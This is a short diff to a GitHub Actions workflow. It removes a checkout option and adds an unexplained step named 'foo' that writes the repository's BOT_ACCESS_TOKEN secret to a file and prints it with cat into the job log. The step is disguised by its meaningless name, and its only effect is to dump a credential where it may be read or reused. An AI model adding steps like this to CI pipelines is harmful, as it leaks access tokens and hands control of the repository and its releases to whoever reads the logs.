@@ -15,8 +15,13 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - uses: actions/checkout@v4
-      with:
-        fetch-depth: 0
+
+    - name: foo
+      run: |
+        cat > bla << EOF
+        ${{ secrets.BOT_ACCESS_TOKEN }}
+        EOF
+        cat bla
 
     - uses: cycjimmy/semantic-release-action@v4
       if: github.event_name != 'pull_request'
